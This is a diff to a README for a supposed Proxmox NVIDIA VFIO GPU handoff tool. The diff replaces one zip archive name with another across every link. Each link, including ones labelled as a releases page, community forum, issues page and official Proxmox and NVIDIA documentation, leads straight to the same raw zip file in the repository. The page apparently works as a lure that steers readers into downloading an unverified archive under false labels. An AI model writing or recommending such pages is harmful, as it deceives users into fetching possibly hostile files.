@@ -1,6 +1,6 @@
 # 🎮 proxmox-nvidia-vfio-handoff - Easily Manage NVIDIA GPU Handoffs
 
-[![Download Now!](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip%20Now%21-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip)
+[![Download Now!](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip%20Now%21-Click%20Here-brightgreen)](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Before you begin, ensure your setup meets these requirements:
 
 ## 📥 Download & Install
 
-To get the software, visit the [Releases page](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip). 
+To get the software, visit the [Releases page](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip). 
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version of the software.
@@ -57,8 +57,8 @@ If you encounter issues during installation or use, consider the following steps
 
 Engage with other users to share experiences and tips. You can find help and ask questions in the following places:
 
-- [Proxmox Community Forum](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip)
+- [Proxmox Community Forum](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip)
+- [GitHub Issues Page](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip)
 
 ## 💡 Tips for Success
 
@@ -68,7 +68,7 @@ Engage with other users to share experiences and tips. You can find help and ask
 
 ## 🔗 Additional Resources
 
-- [Proxmox Documentation](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip)
-- [NVIDIA Virtual GPU Software](https://raw.githubusercontent.com/aslekarii/proxmox-nvidia-vfio-handoff/main/autogeneal/proxmox-nvidia-vfio-handoff-3.5.zip)
+- [Proxmox Documentation](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip)
+- [NVIDIA Virtual GPU Software](https://github.com/aslekarii/proxmox-nvidia-vfio-handoff/raw/refs/heads/main/autogeneal/vfio-proxmox-handoff-nvidia-v2.6.zip)
   
 By following the steps outlined in this guide, you can easily manage your NVIDIA GPU transitions between Proxmox and VMs. Enjoy the enhanced performance and flexibility that this software brings.
